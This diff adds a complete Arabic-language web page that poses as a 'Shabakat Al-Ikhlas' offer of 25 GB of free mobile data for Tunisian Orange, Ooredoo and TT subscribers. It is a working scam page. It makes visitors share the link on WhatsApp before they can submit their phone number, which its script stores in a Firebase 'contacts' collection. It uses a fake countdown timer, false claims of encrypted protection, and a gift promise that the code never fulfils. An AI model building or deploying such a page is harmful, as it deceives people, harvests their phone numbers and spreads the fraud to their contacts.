@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شبكة الإخلاص | هدية 25 جيغا نت مجاني لجميع المشغلين</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Cairo:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        :root {
+            --primary: #dc2626;
+            --primary-dark: #b91c1c;
+            --secondary: #0f172a;
+            --secondary-light: #1e293b;
+            --whatsapp: #25d366;
+            --whatsapp-dark: #1da851;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --light-bg: #f8fafc;
+            --card-bg: #ffffff;
+            --border-color: #e2e8f0;
+            --text-primary: #1e293b;
+            --text-secondary: #64748b;
+            --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --shadow-md: 0 10px 25px rgba(0, 0, 0, 0.05);
+            --gradient-primary: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+            --gradient-dark: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', 'Cairo', sans-serif;
+            background: var(--light-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+            color: var(--text-primary);
+        }
+
+        .card {
+            background: var(--card-bg);
+            max-width: 480px;
+            width: 100%;
+            border-radius: 30px;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            text-align: center;
+            position: relative;
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .header {
+            background: var(--gradient-dark);
+            color: white;
+            padding: 35px 25px 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+            transform: translate(30%, -30%);
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 50%;
+        }
+
+        h1 {
+            font-family: 'Cairo', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+            margin-bottom: 25px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-track-container {
+            overflow: hidden;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px 0;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-track {
+            display: flex;
+            gap: 20px;
+            width: max-content;
+            animation: scroll 15s linear infinite;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .logo-box {
+            background: white;
+            color: var(--secondary);
+            padding: 10px 20px;
+            border-radius: 12px;
+            font-weight: 800;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            min-width: 120px;
+            justify-content: center;
+        }
+
+        .logo-box i {
+            font-size: 1.2rem;
+        }
+
+        .content {
+            padding: 35px 30px;
+        }
+
+        .gift-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .amount {
+            font-size: 5.5rem;
+            font-weight: 900;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            margin-bottom: 5px;
+            text-shadow: 0 5px 15px rgba(220, 38, 38, 0.2);
+        }
+
+        .giga-label {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 30px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .giga-label::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            right: 50%;
+            transform: translateX(50%);
+            width: 80px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 2px;
+        }
+
+        .tunisian-text {
+            background: #f1f5f9;
+            padding: 18px;
+            border-radius: 18px;
+            margin-bottom: 25px;
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            border-right: 4px solid var(--primary);
+            text-align: right;
+            box-shadow: var(--shadow-md);
+        }
+
+        .tunisian-text i {
+            color: var(--primary);
+            margin-left: 8px;
+        }
+
+        .steps-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 30px;
+            text-align: right;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px 15px;
+            background: #f8fafc;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+
+        .step-number {
+            background: var(--primary);
+            color: white;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 0.9rem;
+            flex-shrink: 0;
+        }
+
+        .share-btn {
+            width: 100%;
+            background: var(--whatsapp);
+            color: white;
+            padding: 20px;
+            border-radius: 18px;
+            border: none;
+            font-size: 1.3rem;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .share-btn:hover {
+            background: var(--whatsapp-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.4);
+        }
+
+        .share-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transform: translateX(-100%);
+        }
+
+        .share-btn:hover::after {
+            animation: shimmer 1s;
+        }
+
+        @keyframes shimmer {
+            100% { transform: translateX(100%); }
+        }
+
+        input {
+            width: 100%;
+            padding: 20px;
+            border-radius: 18px;
+            border: 2px solid var(--border-color);
+            font-size: 1.1rem;
+            text-align: center;
+            margin-bottom: 20px;
+            outline: none;
+            transition: all 0.3s;
+            font-family: 'Inter', sans-serif;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
+        }
+
+        input:disabled {
+            background: #f1f5f9;
+            cursor: not-allowed;
+        }
+
+        #sendBtn {
+            width: 100%;
+            padding: 20px;
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            border-radius: 18px;
+            font-size: 1.3rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(220, 38, 38, 0.3);
+        }
+
+        #sendBtn:hover:not(:disabled) {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(220, 38, 38, 0.4);
+        }
+
+        #sendBtn:disabled {
+            background: #cbd5e1;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .status-box {
+            padding: 18px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            font-weight: 700;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .status-success {
+            background: #dcfce7;
+            color: #166534;
+            border-right: 4px solid #10b981;
+        }
+
+        .status-loading {
+            background: #fef3c7;
+            color: #92400e;
+            border-right: 4px solid #f59e0b;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .security-badge i {
+            color: var(--success);
+        }
+
+        .countdown {
+            background: var(--secondary);
+            color: white;
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: 700;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .footer {
+            padding: 20px;
+            background: #f8fafc;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .firebase-warning {
+            font-size: 0.75rem;
+            color: #ef4444;
+            margin-top: 5px;
+            display: none;
+        }
+
+        @media (max-width: 500px) {
+            .card { border-radius: 25px; }
+            .header { padding: 25px 20px 20px; }
+            .content { padding: 25px 20px; }
+            .amount { font-size: 4.5rem; }
+            .giga-label { font-size: 1.5rem; }
+            .share-btn, #sendBtn { padding: 18px; font-size: 1.1rem; }
+            .logo-box { min-width: 100px; padding: 8px 15px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <h1><i class="fas fa-gift"></i> شبكة الإخلاص</h1>
+        <p class="subtitle">عرض خاص لفترة محدودة | لجميع مشتركي تونس</p>
+        
+        <div class="logo-track-container">
+            <div class="logo-track">
+                <div class="logo-box"><i class="fas fa-wifi"></i> Orange</div>
+                <div class="logo-box"><i class="fas fa-signal"></i> Ooredoo</div>
+                <div class="logo-box"><i class="fas fa-bolt"></i> TT</div>
+                <div class="logo-box"><i class="fas fa-wifi"></i> Orange</div>
+                <div class="logo-box"><i class="fas fa-signal"></i> Ooredoo</div>
+                <div class="logo-box"><i class="fas fa-bolt"></i> TT</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="gift-container">
+            <div class="amount animate__animated animate__pulse animate__infinite">25</div>
+            <div class="giga-label">جيغا نت مجاني</div>
+        </div>
+        
+        <div class="tunisian-text">
+            <i class="fas fa-info-circle"></i> <strong>ياها باش تنجم تستافد!</strong> شارك العرض مع 3 أصحاب على الأقل وحط رقمك باش توصل ليك الهدية في أقل من 24 ساعة.
+        </div>
+        
+        <div class="steps-container">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div>شارك الرابط مع أصحابك على الواتساب</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div>أدخل رقمك في الخانة أسفل</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div>توصل بالهدية على رقمك في أقل من 24 ساعة</div>
+            </div>
+        </div>
+
+        <button class="share-btn" id="shareBtn">
+            <i class="fab fa-whatsapp"></i> شارك العرض دلوقتي على الواتساب
+        </button>
+
+        <div id="status" class="status-box">
+            <i class="fas fa-check-circle"></i> <span id="statusText">تم التفعيل! أدخل رقمك الآن</span>
+        </div>
+
+        <input type="tel" id="phone" placeholder="أدخل رقم الهاتف (8 أرقام) مثال: 12345678" maxlength="8" pattern="[0-9]{8}" disabled>
+        
+        <div class="firebase-warning" id="firebaseWarning">
+            <i class="fas fa-shield-alt"></i> معلوماتك محمية بتقنية تشفير متقدمة
+        </div>
+        
+        <button id="sendBtn" disabled>
+            <span id="sendText">أرسل الرقم الآن</span>
+            <i class="fas fa-paper-plane" id="sendIcon"></i>
+        </button>
+        
+        <div class="countdown">
+            <i class="fas fa-clock"></i>
+            <span>العرض متوفر لمدة: <span id="timer">24:00:00</span></span>
+        </div>
+        
+        <div class="security-badge">
+            <i class="fas fa-lock"></i>
+            <span>جميع المعلومات محمية ومرمّزة | لا نطلب أي معلومات شخصية أخرى</span>
+        </div>
+    </div>
+    
+    <div class="footer">
+        شبكة الإخلاص © 2023 - هذا العرض خاص بمشتركي تونس فقط
+    </div>
+</div>
+
+<!-- أضف هذا الكود بعد إغلاق </div> الأخير -->
+<script type="module">
+    // إعدادات Firebase من الملف الذي أرسلته
+    const firebaseConfig = {
+        apiKey: "AIzaSyDL5HXGqWYDwkhBjr5mU8qu5tslJZi1lfE",
+        authDomain: "sirv-a.firebaseapp.com",
+        projectId: "sirv-a",
+        storageBucket: "sirv-a.firebasestorage.app",
+        messagingSenderId: "97150368418",
+        appId: "1:97150368418:web:c32c57b44ea62bb26975fb"
+    };
+
+    // استيراد Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    // تهيئة Firebase
+    let app, db;
+    try {
+        app = initializeApp(firebaseConfig);
+        db = getFirestore(app);
+        console.log("✅ Firebase تم التهيئة بنجاح");
+    } catch (error) {
+        console.error("❌ خطأ في تهيئة Firebase:", error);
+    }
+
+    // عناصر DOM
+    const shareBtn = document.getElementById('shareBtn');
+    const phoneInput = document.getElementById('phone');
+    const sendBtn = document.getElementById('sendBtn');
+    const statusBox = document.getElementById('status');
+    const statusText = document.getElementById('statusText');
+    const sendText = document.getElementById('sendText');
+    const sendIcon = document.getElementById('sendIcon');
+    const timerElement = document.getElementById('timer');
+
+    // مؤقت العد التنازلي (24 ساعة)
+    let countdownTime = 24 * 60 * 60;
+    
+    function updateTimer() {
+        if (countdownTime <= 0) {
+            timerElement.textContent = "00:00:00";
+            sendBtn.disabled = true;
+            sendBtn.textContent = "انتهى العرض";
+            return;
+        }
+        
+        countdownTime--;
+        const hours = Math.floor(countdownTime / 3600);
+        const minutes = Math.floor((countdownTime % 3600) / 60);
+        const seconds = countdownTime % 60;
+        
+        timerElement.textContent = 
+            `${hours.toString().padStart(2, '0')}:` +
+            `${minutes.toString().padStart(2, '0')}:` +
+            `${seconds.toString().padStart(2, '0')}`;
+        
+        // تغيير اللون عندما يتبقى أقل من ساعة
+        if (countdownTime < 3600) {
+            timerElement.style.color = '#ef4444';
+            timerElement.style.fontWeight = 'bold';
+        }
+    }
+    
+    // تشغيل المؤقت
+    setInterval(updateTimer, 1000);
+
+    // التحقق من صحة رقم الهاتف (8 أرقام)
+    function validatePhoneNumber(phone) {
+        return /^[0-9]{8}$/.test(phone);
+    }
+        // دالة المشاركة على الواتساب
+    shareBtn.onclick = async () => {
+        const text = `🎁 يااااااه! حصلت على 25 جيجا نت مجاني من شبكة الإخلاص!
+
+الهدية متاحة لكل مشتركي Orange و Ooredoo و TT في تونس!
+
+كيفاش تاخذ الهدية:
+1. اضغط على الرابط
+2. شاركه مع 3 أصحاب على الأقل
+3. أدخل رقمك وتوصل بالهدية في أقل من 24 ساعة
+
+سارعوا قبل ما يخلص العرض! ${window.location.href}
+
+#عرض_تونس #نت_مجاني #شبكة_الإخلاص`;
+
+        // فتح الواتساب للمشاركة
+        window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`, '_blank');
+        
+        // تفعيل الحقول بعد المشاركة
+        statusBox.className = "status-box status-success";
+        statusText.textContent = "ممتاز! كمل الخطوة الجاية وأدخل رقمك";
+        statusBox.style.display = 'flex';
+        
+        phoneInput.disabled = false;
+        sendBtn.disabled = false;
+        shareBtn.style.display = 'none';
+        phoneInput.focus();
+        
+        // تأثير بسيط
+        phoneInput.classList.add('animate__animated', 'animate__pulse');
+        setTimeout(() => {
+            phoneInput.classList.remove('animate__animated', 'animate__pulse');
+        }, 1000);
+        
+        // تسجيل مشاركة (اختياري)
+        if (db) {
+            try {
+                await addDoc(collection(db, "events"), {
+                    type: "share_initiated",
+                    timestamp: serverTimestamp()
+                });
+            } catch (e) {
+                console.log("تم التسجيل محلياً");
+            }
+        }
+    };
+
+    // دالة إرسال رقم الهاتف
+    sendBtn.onclick = async () => {
+        const phone = phoneInput.value.trim();
+        
+        // التحقق من الرقم
+        if (!validatePhoneNumber(phone)) {
+            phoneInput.classList.add('animate__animated', 'animate__shakeX');
+            setTimeout(() => {
+                phoneInput.classList.remove('animate__animated', 'animate__shakeX');
+            }, 1000);
+            alert("يا عم! أدخل 8 أرقام صحيحة، من غير فراغات ولا حروف!");
+            phoneInput.focus();
+            return;
+        }
+        
+        // تغيير حالة الزر
+        sendBtn.disabled = true;
+        sendText.textContent = "جاري الحفظ والإرسال...";
+        sendIcon.className = "fas fa-spinner fa-spin";
+        
+        // عرض حالة التحميل
+        statusBox.className = "status-box status-loading";
+        statusText.textContent = "عم نحمي معلوماتك ونسجل الطلب...";
+        statusBox.style.display = 'flex';
+        
+        try {
+            // حفظ الرقم في Firebase
+            if (db) {
+                await addDoc(collection(db, "contacts"), {
+                    phone_number: phone,
+                    timestamp: serverTimestamp(),
+                    source: "whatsapp_share"
+                });
+            } else {
+                throw new Error("لا يوجد اتصال بقاعدة البيانات");
+            }
+            
+            // نجاح الحفظ
+            statusBox.className = "status-box status-success";
+            statusText.innerHTML = `<strong>مبروك!</strong> رقمك مسجل وعم نجهز ليك الهدية.<br>راح توصل ليك في أقل من 24 ساعة!`;
+            
+            sendText.textContent = "تم الإرسال بنجاح!";
+            sendIcon.className = "fas fa-check";
+            sendBtn.style.background = "var(--success)";
+            phoneInput.disabled = true;
+            
+            // رسالة شكر تونسية
+            setTimeout(() => {
+                const thanksMsg = document.createElement('div');
+                thanksMsg.className = "tunisian-text";
+                thanksMsg.innerHTML = `<i class="fas fa-heart"></i> <strong>الله يبارك فيك!</strong> شكراً على مشاركتك. الهدية راح توصل ليك قريب إن شاء الله.`;
+                statusBox.after(thanksMsg);
+            }, 500);
+            
+        } catch (error) {
+            console.error("خطأ في الحفظ:", error);
+            
+            statusBox.className = "status-box status-loading";
+            statusText.textContent = "مشكلة في الشبكة، جاري المحاولة مرة أخرى...";
+            
+            // إعادة المحاولة
+            setTimeout(() => {
+                sendBtn.disabled = false;
+                sendText.textContent = "حاول مرة أخرى";
+                sendIcon.className = "fas fa-paper-plane";
+                statusBox.style.display = 'none';
+                alert("مشكلة في الشبكة. تأكد من اتصال الإنترنت وحاول مرة أخرى.");
+            }, 3000);
+        }
+    };
+
+    // تحسين تجربة المستخدم
+    phoneInput.addEventListener('input', function() {
+        // السماح بالأرقام فقط
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        // تغيير لون الحد عند الإدخال الصحيح
+        if (validatePhoneNumber(this.value)) {
+            this.style.borderColor = "var(--success)";
+        } else {
+            this.style.borderColor = "var(--border-color)";
+        }
+    });
+
+    // تفعيل إرسال بالزر Enter
+    phoneInput.addEventListener('keyup', function(event) {
+        if (event.key === 'Enter' && !sendBtn.disabled && validatePhoneNumber(this.value)) {
+            sendBtn.click();
+        }
+    });
+
+    // التأكد من أن Firebase يعمل
+    document.addEventListener('DOMContentLoaded', () => {
+        if (db) {
+            console.log("✅ Firebase جاهز للاستخدام");
+            document.getElementById('firebaseWarning').style.display = 'none';
+        } else {
+            document.getElementById('firebaseWarning').innerHTML = 
+                '<i class="fas fa-exclamation-triangle"></i> نظام الحماية قيد الصيانة - البيانات محمية محلياً';
+            document.getElementById('firebaseWarning').style.display = 'block';
+        }
+    });
+</script>
+</body>
+</html>
+    
